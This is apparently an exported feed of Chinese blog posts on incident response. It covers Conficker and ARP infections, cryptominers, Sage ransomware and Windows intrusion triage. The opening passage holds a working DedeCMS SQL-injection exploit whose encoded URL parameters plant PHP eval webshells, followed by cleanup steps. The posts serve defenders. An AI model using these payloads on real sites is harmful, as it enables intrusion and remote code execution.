rrs2[]=85&amp;arrs2[]=69&amp;arrs2[]=83&amp;arrs2[]=40&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=49&amp;arrs2[]=51&amp;arrs2[]=44&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=123&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=103&amp;arrs2[]=117&amp;arrs2[]=105&amp;arrs2[]=103&amp;arrs2[]=101&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=123&amp;arrs2[]=47&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=35&amp;arrs2[]=32&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96</code> </p><p>（3）执行EXP后，将向数据库表dede_mytag中插入一条记录，</p><p><img src="/images/8-6.png" alt></p><p>（4）执行如下语句，在/plus目录下生成90sec.php一句话木马 <a href="http://www.xxxx.com/plus/mytag_js.php?aid=9013" target="_blank" rel="noopener">http://www.xxxx.com/plus/mytag_js.php?aid=9013</a></p><p><strong>利用方式三：使/plus/ad_js.php文件变为一句话木马php</strong></p><p>（1）如：构造如下注入SQL语句：</p><p><code>cfg_dbprefixmyadSETnormbody= &#39;&lt;?php file_put_contents(&#39;&#39;read.php&#39;&#39;,&#39;&#39;&lt;?php eval($_POST[x]);echo mOon;?&gt;&#39;&#39;);?&gt;&#39; WHEREaid</code> =19 #`  </p><p>（2）对应的EXP:</p><p><code>/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35</code></p><p>（3）执行EXP后，将向数据库表dede_myad中插入一条记录。</p><p>（4）进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。</p><hr><p>如何清除？</p><p>1、删除网站目录中的webshell</p><p>2、清除dede_myad、dede_mytag数据库表中插入的SQL语句，防止再次被调用生成webshell。</p><p>如何防御？</p><p>网站采用开源CMS搭建，建议及时对官方发布的系统补丁以及内核版本进行升级。</p>]]></content>
      
      
      <categories>
          
          <category> web实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章第2篇：蠕虫病毒</title>
      <link href="/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/"/>
      <url>/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第2篇：蠕虫病毒"><a href="#第2篇：蠕虫病毒" class="headerlink" title="第2篇：蠕虫病毒"></a>第2篇：蠕虫病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    蠕虫病毒是一种十分古老的计算机病毒，它是一种自包含的程序（或是一套程序），通常通过网络途径传播，每入侵到一台新的计算机，它就在这台计算机上复制自己，并自动执行它自身的程序。</p><p>常见的蠕虫病毒：熊猫烧香病毒 、冲击波/震荡波病毒、conficker病毒等。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天早上，管理员在出口防火墙发现内网服务器不断向境外IP发起主动连接，内网环境，无法连通外网，无图脑补。</p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>在出口防火墙看到的服务器内网IP，首先将中病毒的主机从内网断开，然后登录该服务器，打开D盾_web查杀查看端口连接情况，可以发现本地向外网IP发起大量的主动连接：</p><p><img src="/images/win-6-1.png" alt></p><p>通过端口异常，跟踪进程ID，可以找到该异常由svchost.exe windows服务主进程引起，svchost.exe向大量远程IP的445端口发送请求：</p><p><img src="/images/win-6-2.png" alt></p><p>这里我们推测可以系统进程被病毒感染，使用卡巴斯基病毒查杀工具，对全盘文件进行查杀，发现c:\windows\system32\qntofmhz.dll异常：</p><p><img src="/images/win-6-3.png" alt></p><p>使用多引擎在线病毒扫描（<a href="http://www.virscan.org/）" target="_blank" rel="noopener">http://www.virscan.org/）</a> 对该文件进行扫描:</p><p><img src="/images/win-6-4.png" alt></p><p>确认服务器感染conficker蠕虫病毒，下载conficker蠕虫专杀工具对服务器进行清查，成功清楚病毒。 </p><p><img src="/images/win-6-5.png" alt></p><p>大致的处理流程如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接</span><br><span class="line">2、病毒查杀：卡巴斯基全盘扫描，发现异常文件</span><br><span class="line">3、确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。</span><br><span class="line">4、病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。</span><br></pre></td></tr></table></figure><h3 id="0x04-预防处理措施"><a href="#0x04-预防处理措施" class="headerlink" title="0x04 预防处理措施"></a>0x04 <strong>预防处理措施</strong></h3><p>​    在政府、医院内网，依然存在着一些很古老的感染性病毒，如何保护电脑不受病毒感染，总结了几种预防措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、安装杀毒软件，定期全盘扫描</span><br><span class="line">2、不使用来历不明的软件，不随意接入未经查杀的U盘</span><br><span class="line">3、定期对windows系统漏洞进行修复，不给病毒可乘之机</span><br><span class="line">4、做好重要文件的备份，备份，备份。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章第4篇：ARP病毒</title>
      <link href="/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/"/>
      <url>/2019/10/16/%E7%AC%AC4%E7%AF%87%EF%BC%9AARP%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第4篇：ARP病毒"><a href="#第4篇：ARP病毒" class="headerlink" title="第4篇：ARP病毒"></a>第4篇：ARP病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>　　ARP病毒并不是某一种病毒的名称，而是对利用arp协议的漏洞进行传播的一类病毒的总称，目前在局域网中较为常见。发作的时候会向全网发送伪造的ARP数据包，严重干扰全网的正常运行，其危害甚至比一些蠕虫病毒还要严重得多。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p> 　　某天早上，小伙伴给我发了一个微信，说192.168.64.76 CPU现在负载很高，在日志分析平台查看了一下这台服务器的相关日志，流量在某个时间点暴涨，发现大量137端口的UDP攻击。</p><p><img src="/images/win-9-1.png" alt></p><h3 id="0x02-分析过程"><a href="#0x02-分析过程" class="headerlink" title="0x02 分析过程"></a>0x02 分析过程</h3><p> 　　登录服务器，首先查看137端口对应的进程，进程ID为4对应的进程是SYSTEM，于是使用杀毒软件进行全盘查杀。</p><p><img src="/images/win-9-2.png" alt></p><p>卡巴斯基绿色版：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe" target="_blank" rel="noopener">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></p><p>卡巴斯基、360杀毒、McAfee查杀无果，手工将启动项、计划任务、服务项都翻了一遍，并未发现异常。<br>本地下载了IpTool抓包工具，筛选条件： 协议 UDP  端口 137</p><p><img src="/images/win-9-3.png" alt></p><p>可以明显的看出192.168.64.76发送的数据包是异常的，192.168.64.76的数据包目的地址，一直在变，目的MAC是不变的，而这个MAC地址就是网关的MAC。</p><p>端口137的udp包是netbios的广播包，猜测：可能是ARP病毒，由本机对外的ARP攻击。</p><p>采用措施：通过借助一些安全软件来实现局域网ARP检测及防御功能。</p><p>服务器安全狗Windows版下载：<a href="http://free.safedog.cn/server_safedog.html" target="_blank" rel="noopener">http://free.safedog.cn/server_safedog.html</a></p><p>网络防火墙–攻击防护–ARP防火墙：</p><p><img src="/images/win-9-4.png" alt></p><p>虽然有拦截了部分ARP请求，但流量出口还是有一些137 UDF的数据包。</p><p>看来还是得下狠招，关闭137端口：禁用TCP/IP上的NetBIOS。</p><p>1）、禁用Server服务</p><p><img src="/images/win-9-5.png" alt></p><p>2）、禁用 TCP/IP 上的 NetBIOS </p><p><img src="/images/win-9-6.png" alt></p><p> 设置完，不用重启即可生效，137端口关闭，观察了一会，对外发起的请求已消失，CPU和网络带宽恢复正常。</p><h3 id="0x04-防护措施"><a href="#0x04-防护措施" class="headerlink" title="0x04 防护措施"></a>0x04 防护措施</h3><p>　　局域网安全防护依然是一项很艰巨的任务，网络的安全策略，个人/服务器的防毒机制，可以在一定程度上防止病毒入侵。</p><p>　　另外不管是个人PC还是服务器，总还是需要做一些基本的安全防护：1、关闭135/137/138/139/445等端口<br>2、更新系统补丁。</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章第6篇：挖矿病毒（二)</title>
      <link href="/2019/10/16/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2019/10/16/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第6篇：挖矿病毒（二）"><a href="#第6篇：挖矿病毒（二）" class="headerlink" title="第6篇：挖矿病毒（二）"></a>第6篇：挖矿病毒（二）</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>　　作为一个运维工程师，而非一个专业的病毒分析工程师，遇到了比较复杂的病毒怎么办？别怕，虽然对二进制不熟，但是依靠系统运维的经验，我们可以用自己的方式来解决它。</p><h3 id="0x01-感染现象"><a href="#0x01-感染现象" class="headerlink" title="0x01 感染现象"></a>0x01 感染现象</h3><p>1、向大量远程IP的445端口发送请求</p><p><img src="/images/win-10-1.png" alt></p><p>2、使用各种杀毒软件查杀无果，虽然能识别出在C:\Windows\NerworkDistribution中发现异常文件，但即使删除NerworkDistribution后，每次重启又会再次生成。 </p><p><img src="/images/win-10-2.jpg" alt></p><p>连杀软清除不了的病毒，只能手工来吧，个人比较偏好火绒，界面比较简洁，功能也挺好用的，自带的火绒剑是安全分析利器。于是安装了火绒，有了如下分析排查过程。</p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><h4 id="A、网络链接"><a href="#A、网络链接" class="headerlink" title="A、网络链接"></a>A、网络链接</h4><p>通过现象，找到对外发送请求的进程ID：4960</p><p><img src="/images/win-10-3.png" alt></p><h4 id="B、进程分析"><a href="#B、进程分析" class="headerlink" title="B、进程分析"></a>B、进程分析</h4><p>进一步通过进程ID找到相关联的进程，父进程为1464</p><p><img src="/images/win-10-4.png" alt></p><p>找到进程ID为1464的服务项，逐一排查，我们发现服务项RemoteUPnPService存在异常。 </p><p><img src="/images/win-10-5.png" alt></p><h4 id="C、删除服务"><a href="#C、删除服务" class="headerlink" title="C、删除服务"></a>C、删除服务</h4><p>选择可疑服务项，右键属性，停止服务，启动类型：禁止。</p><p><img src="/images/win-10-6.png" alt></p><p>停止并禁用服务，再清除NerworkDistribution目录后，重启计算机。异常请求和目录的现象消失。</p><p>又排查了几台，现象一致，就是服务项的名称有点变化。</p><p><img src="/images/win-10-7.png" alt></p><h4 id="D、病毒清除"><a href="#D、病毒清除" class="headerlink" title="D、病毒清除"></a>D、病毒清除</h4><p>挖矿病毒清除过程如下：</p><p>1、 停止并禁用可疑的服务项，服务项的名称会变，但描述是不变的，根据描述可快速找到可疑服务项。</p><p>​    可疑服务项描述：Enables a common interface and object model for the Remote UPnP Service to access</p><p>​    删除服务项：Sc delete RemoteUPnPService</p><p>2、  删除C:\Windows\NerworkDistribution目录</p><p>3、  重启计算机</p><p>4、  使用杀毒软件全盘查杀</p><p>5、  到微软官方网站下载对应操作系统补丁，下载链接：</p><p>　　<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010</a></p><h3 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h3><p>在查询了大量资料后，找到了一篇在2018年2月有关该病毒的报告：</p><p>NrsMiner：一个构造精密的挖矿僵尸网络</p><p><a href="https://www.freebuf.com/articles/system/162874.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/162874.html</a></p><p>根据文章提示，这个病毒的构造非常的复杂，主控模块作为服务“Hyper-VAccess Protection Agent Service”的ServiceDll存在。但与目前处理的情况有所不同，该病毒疑似是升级了。</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章第3篇：勒索病毒</title>
      <link href="/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
      <url>/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第3篇：勒索病毒"><a href="#第3篇：勒索病毒" class="headerlink" title="第3篇：勒索病毒"></a>第3篇：勒索病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p><p><img src="/images/win-7-1.png" alt></p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​    登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p><p><img src="/images/win-7-2.png" alt></p><p>打开!HELP_SOS.hta文件，显示如下： </p><p><img src="/images/win-7-3.png" alt></p><p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。" target="_blank" rel="noopener">http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</a></p><p><img src="/images/win-7-4.png" alt></p><p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 </p><p>遇到了，别急，试一试勒索病毒解密工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">360安全卫士勒索病毒专题</span><br><span class="line">http://lesuobingdu.360.cn</span><br></pre></td></tr></table></figure><h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​    一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br><span class="line">4、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line">5、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第4章第5篇：挖矿病毒（一）</title>
      <link href="/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2019/10/16/%E7%AC%AC5%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第5篇：挖矿病毒（一）"><a href="#第5篇：挖矿病毒（一）" class="headerlink" title="第5篇：挖矿病毒（一）"></a>第5篇：挖矿病毒（一）</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。</p><p><img src="/images/win-8-1.png" alt></p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​    登录网站服务器进行排查，发现多个异常进程：</p><p><img src="/images/win-8-2.png" alt></p><p>分析进程参数：</p><p>wmic process get caption,commandline /value &gt;&gt; tmp.txt</p><p><img src="/images/win-8-3.png" alt></p><p>TIPS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在windows下查看某个运行程序（或进程）的命令行参数</span><br><span class="line">使用下面的命令：</span><br><span class="line">wmic process get caption,commandline /value</span><br><span class="line">如果想查询某一个进程的命令行参数，使用下列方式：</span><br><span class="line">wmic process where caption=”svchost.exe” get caption,commandline /value</span><br><span class="line">这样就可以得到进程的可执行文件位置等信息。</span><br></pre></td></tr></table></figure><p>访问该链接：</p><p><img src="/images/win-8-4.png" alt></p><p>Temp目录下发现Carbon、run.bat挖矿程序:</p><p><img src="/images/win-8-5.png" alt></p><p>具体技术分析细节详见：</p><blockquote><p>360CERT：利用WebLogic漏洞挖矿事件分析</p><p><a href="https://www.anquanke.com/post/id/92223" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92223</a></p></blockquote><p>清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。</p><p><strong>临时防护方案</strong></p><ol><li><p>根据实际环境路径，删除WebLogic程序下列war包及目录</p><p>rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</p><p>rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</p><p>rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat </p></li><li><p>重启WebLogic或系统后，确认以下链接访问是否为404</p><p><a href="http://x.x.x.x:7001/wls-wsat" target="_blank" rel="noopener">http://x.x.x.x:7001/wls-wsat</a></p></li></ol><h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​    新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞，如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞，Struts2远程命令执行等，导致大量服务器被感染挖矿程序的现象 。总结了几种预防措施：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第四章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1章第1篇：window入侵排查</title>
      <link href="/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
      <url>/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第1篇：window入侵排查"><a href="#第1篇：window入侵排查" class="headerlink" title="第1篇：window入侵排查"></a>第1篇：window入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>web入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Window服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入<code>lusrmgr.msc</code>命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="/images/sum-1-1.png" alt></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出Windows日志–安全，利用Log Parser进行分析。</p></li></ul><p><img src="/images/sum-1-2.png" alt></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED </p><p>b、根据netstat 定位出的pid，再通过tasklist命令进行进程定位 tasklist  | findstr “PID”</p></li></ul><p><img src="/images/sum-1-3.png" 